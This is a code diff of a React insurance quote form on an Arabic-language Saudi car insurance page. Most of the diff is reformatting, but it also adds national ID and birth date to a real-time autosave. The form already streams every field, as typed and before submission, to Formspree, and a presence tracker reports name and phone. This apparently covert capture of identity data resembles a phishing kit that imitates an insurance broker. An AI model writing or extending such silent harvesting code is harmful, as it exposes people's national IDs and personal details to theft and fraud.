@@ -29,33 +29,42 @@ export const QuoteForm = () => {
   const [serialNumber, setSerialNumber] = useState("");
   const { toast } = useToast();
   const { applicationId, createOrUpdateApplication } = useApplicationData();
-  usePresence(applicationId || undefined, 'quote_form', { fullName: ownerName, phone: phoneNumber });
-  
+  usePresence(applicationId || undefined, "quote_form", { fullName: ownerName, phone: phoneNumber });
+
   useEffect(() => {
-    console.log('Quote form mounted with applicationId:', applicationId);
+    console.log("Quote form mounted with applicationId:", applicationId);
   }, [applicationId]);
 
   // Send data to Formspree in real-time
-  useFormspreeSync({
-    insuranceType,
-    documentType,
-    birthDate: birthDate ? format(birthDate, "PPP", { locale: ar }) : "",
-    idNumber,
-    ownerName,
-    phoneNumber,
-    serialNumber
-  }, "صفحة عرض السعر - Quote Form");
+  useFormspreeSync(
+    {
+      insuranceType,
+      documentType,
+      birthDate: birthDate ? format(birthDate, "PPP", { locale: ar }) : "",
+      idNumber,
+      ownerName,
+      phoneNumber,
+      serialNumber,
+    },
+    "صفحة عرض السعر - Quote Form",
+  );
 
   // Auto-save to database in real-time
-  useAutoSave(applicationId, {
-    insurance_type: insuranceType,
-    document_type: documentType,
-    full_name: ownerName,
-    phone: phoneNumber,
-    serial_number: serialNumber,
-    current_step: 'quote_form'
-  }, "QuoteForm");
-  
+  useAutoSave(
+    applicationId,
+    {
+      insurance_type: insuranceType,
+      document_type: documentType,
+      full_name: ownerName,
+      phone: phoneNumber,
+      national_id: idNumber,
+      birth_date: birthDate ? format(birthDate, "yyyy-MM-dd") : "",
+      serial_number: serialNumber,
+      current_step: "quote_form",
+    },
+    "QuoteForm",
+  );
+
   // للتقويم
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: 100 }, (_, i) => currentYear - i);
@@ -73,15 +82,13 @@ export const QuoteForm = () => {
     { value: "10", label: "نوفمبر" },
     { value: "11", label: "ديسمبر" },
   ];
-  
-  const [calendarMonth, setCalendarMonth] = useState<Date>(
-    birthDate || new Date(1990, 0, 1)
-  );
+
+  const [calendarMonth, setCalendarMonth] = useState<Date>(birthDate || new Date(1990, 0, 1));
 
   const handleSubmit = async () => {
     // helper: يكشف الأنماط المتكررة (مثل سرسرسرسر أو ااااا أو 12121212)
     const hasRepeatedPattern = (text: string): boolean => {
-      const t = text.replace(/\s+/g, '');
+      const t = text.replace(/\s+/g, "");
       // نفس الحرف مكرر 4+ مرات متتالية
       if (/(.)\1{3,}/.test(t)) return true;
       // مقطع من حرفين/ثلاثة مكرر 3+ مرات (سرسرسر، ابابابا)
@@ -127,7 +134,7 @@ export const QuoteForm = () => {
       return;
     }
 
-    if (!trimmedName.includes(' ')) {
+    if (!trimmedName.includes(" ")) {
       toast({
         title: "اسم غير مكتمل",
         description: "يرجى إدخال الاسم الثلاثي أو الرباعي كاملاً",
@@ -171,7 +178,7 @@ export const QuoteForm = () => {
       });
       return;
     }
-    
+
     if (serialNumber.length !== 9) {
       toast({
         title: "خطأ",
@@ -180,7 +187,7 @@ export const QuoteForm = () => {
       });
       return;
     }
-    
+
     try {
       // حفظ البيانات في قاعدة البيانات
       await createOrUpdateApplication({
@@ -189,15 +196,15 @@ export const QuoteForm = () => {
         full_name: ownerName,
         phone: phoneNumber,
         serial_number: serialNumber,
-        current_step: 'quote_form',
-        status: 'pending'
+        current_step: "quote_form",
+        status: "pending",
       });
 
       toast({
         title: "تم بنجاح",
         description: "تم حفظ البيانات. جاري الانتقال إلى الصفحة التالية...",
       });
-      
+
       setTimeout(() => {
         navigate("/vehicle-info");
       }, 1000);
@@ -209,7 +216,8 @@ export const QuoteForm = () => {
       });
     }
   };
-  return <section id="quote-form" className="scroll-mt-24 py-8 md:py-16 px-3 md:px-6 bg-background">
+  return (
+    <section id="quote-form" className="scroll-mt-24 py-8 md:py-16 px-3 md:px-6 bg-background">
       <div className="container mx-auto max-w-2xl">
         <div className="text-center mb-6 md:mb-8">
           <h2 className="text-xl md:text-3xl font-bold text-foreground mb-2 md:mb-3">احصل على عرض سعر</h2>
@@ -218,10 +226,20 @@ export const QuoteForm = () => {
         <Card className="p-4 md:p-8 shadow-lg border-border">
           {/* Insurance Type Selection */}
           <div className="grid grid-cols-2 gap-2 md:gap-4 mb-4 md:mb-6">
-            <Button variant={insuranceType === "new" ? "default" : "outline"} size="default" onClick={() => setInsuranceType("new")} className="w-full text-sm md:text-base md:h-11">
+            <Button
+              variant={insuranceType === "new" ? "default" : "outline"}
+              size="default"
+              onClick={() => setInsuranceType("new")}
+              className="w-full text-sm md:text-base md:h-11"
+            >
               تأمين جديد
             </Button>
-            <Button variant={insuranceType === "transfer" ? "default" : "outline"} size="default" onClick={() => setInsuranceType("transfer")} className="w-full text-sm md:text-base md:h-11">
+            <Button
+              variant={insuranceType === "transfer" ? "default" : "outline"}
+              size="default"
+              onClick={() => setInsuranceType("transfer")}
+              className="w-full text-sm md:text-base md:h-11"
+            >
               نقل ملكية
             </Button>
           </div>
@@ -230,13 +248,13 @@ export const QuoteForm = () => {
           <div className="space-y-4 md:space-y-6">
             {/* ID/Iqama Number */}
             <div className="space-y-2">
-              <Input 
-                type="tel" 
-                placeholder="رقم الهوية / الإقامة الخاص بك" 
+              <Input
+                type="tel"
+                placeholder="رقم الهوية / الإقامة الخاص بك"
                 className="w-full text-right"
                 value={idNumber}
                 onChange={(e) => {
-                  const value = e.target.value.replace(/[^0-9]/g, '');
+                  const value = e.target.value.replace(/[^0-9]/g, "");
                   setIdNumber(value);
                 }}
                 inputMode="numeric"
@@ -247,13 +265,13 @@ export const QuoteForm = () => {
 
             {/* Owner Name */}
             <div className="space-y-2">
-              <Input 
-                type="text" 
-                placeholder="اسم مالك الوثيقة كاملاً" 
+              <Input
+                type="text"
+                placeholder="اسم مالك الوثيقة كاملاً"
                 className="w-full text-right"
                 value={ownerName}
                 onChange={(e) => {
-                  const value = e.target.value.replace(/[^a-zA-Zأ-ي\s]/g, '');
+                  const value = e.target.value.replace(/[^a-zA-Zأ-ي\s]/g, "");
                   setOwnerName(value);
                 }}
               />
@@ -261,14 +279,14 @@ export const QuoteForm = () => {
 
             {/* Phone Number */}
             <div className="space-y-2">
-              <Input 
-                type="tel" 
-                placeholder="رقم الهاتف05" 
-                className="w-full text-right" 
+              <Input
+                type="tel"
+                placeholder="رقم الهاتف05"
+                className="w-full text-right"
                 dir="ltr"
                 value={phoneNumber}
                 onChange={(e) => {
-                  const value = e.target.value.replace(/[^0-9]/g, '');
+                  const value = e.target.value.replace(/[^0-9]/g, "");
                   setPhoneNumber(value);
                 }}
                 inputMode="numeric"
@@ -285,14 +303,10 @@ export const QuoteForm = () => {
                     variant="outline"
                     className={cn(
                       "w-full justify-between text-right font-normal",
-                      !birthDate && "text-muted-foreground"
+                      !birthDate && "text-muted-foreground",
                     )}
                   >
-                    {birthDate ? (
-                      format(birthDate, "PPP", { locale: ar })
-                    ) : (
-                      <span>تاريخ الميلاد</span>
-                    )}
+                    {birthDate ? format(birthDate, "PPP", { locale: ar }) : <span>تاريخ الميلاد</span>}
                     <CalendarIcon className="h-4 w-4 opacity-50" />
                   </Button>
                 </PopoverTrigger>
@@ -317,7 +331,7 @@ export const QuoteForm = () => {
                         ))}
                       </SelectContent>
                     </Select>
-                    
+
                     <Select
                       value={calendarMonth.getFullYear().toString()}
                       onValueChange={(value) => {
@@ -338,16 +352,14 @@ export const QuoteForm = () => {
                       </SelectContent>
                     </Select>
                   </div>
-                  
+
                   <Calendar
                     mode="single"
                     selected={birthDate}
                     onSelect={setBirthDate}
                     month={calendarMonth}
                     onMonthChange={setCalendarMonth}
-                    disabled={(date) =>
-                      date > new Date() || date < new Date("1900-01-01")
-                    }
+                    disabled={(date) => date > new Date() || date < new Date("1900-01-01")}
                     initialFocus
                     className="pointer-events-auto"
                   />
@@ -357,10 +369,20 @@ export const QuoteForm = () => {
 
             {/* Document Type Selection */}
             <div className="grid grid-cols-2 gap-2 md:gap-4">
-              <Button variant={documentType === "customs" ? "outline" : "default"} size="default" onClick={() => setDocumentType("registration")} className="w-full text-sm md:text-base md:h-11">
+              <Button
+                variant={documentType === "customs" ? "outline" : "default"}
+                size="default"
+                onClick={() => setDocumentType("registration")}
+                className="w-full text-sm md:text-base md:h-11"
+              >
                 استمارة
               </Button>
-              <Button variant={documentType === "customs" ? "default" : "outline"} size="default" onClick={() => setDocumentType("customs")} className="w-full text-sm md:text-base md:h-11">
+              <Button
+                variant={documentType === "customs" ? "default" : "outline"}
+                size="default"
+                onClick={() => setDocumentType("customs")}
+                className="w-full text-sm md:text-base md:h-11"
+              >
                 بطاقة جمركية
               </Button>
             </div>
@@ -368,14 +390,14 @@ export const QuoteForm = () => {
             {/* Serial Number / Customs Card */}
             <div className="space-y-2">
               <Label className="text-right block">الرقم التسلسلي / بطاقة جمركية</Label>
-              <Input 
-                type="tel" 
-                placeholder="000000000" 
-                className="w-full text-center tracking-widest text-lg font-semibold" 
+              <Input
+                type="tel"
+                placeholder="000000000"
+                className="w-full text-center tracking-widest text-lg font-semibold"
                 dir="ltr"
                 value={serialNumber}
                 onChange={(e) => {
-                  const value = e.target.value.replace(/[^0-9]/g, '');
+                  const value = e.target.value.replace(/[^0-9]/g, "");
                   setSerialNumber(value);
                 }}
                 inputMode="numeric"
@@ -385,13 +407,11 @@ export const QuoteForm = () => {
             </div>
 
             {/* CAPTCHA */}
-            <div className="space-y-2">
-              
-            </div>
+            <div className="space-y-2"></div>
 
             {/* Submit Button */}
-            <Button 
-              size="lg" 
+            <Button
+              size="lg"
               className="w-full bg-secondary hover:bg-secondary/90 text-secondary-foreground text-sm md:text-base"
               onClick={handleSubmit}
             >
@@ -400,11 +420,11 @@ export const QuoteForm = () => {
 
             {/* Disclaimer Text */}
             <p className="text-center text-sm text-muted-foreground leading-relaxed">
-              أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم
-              و/أو مركز المعلومات الوطني عن بياناتي
+              أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
             </p>
           </div>
         </Card>
       </div>
-    </section>;
+    </section>
+  );
 };
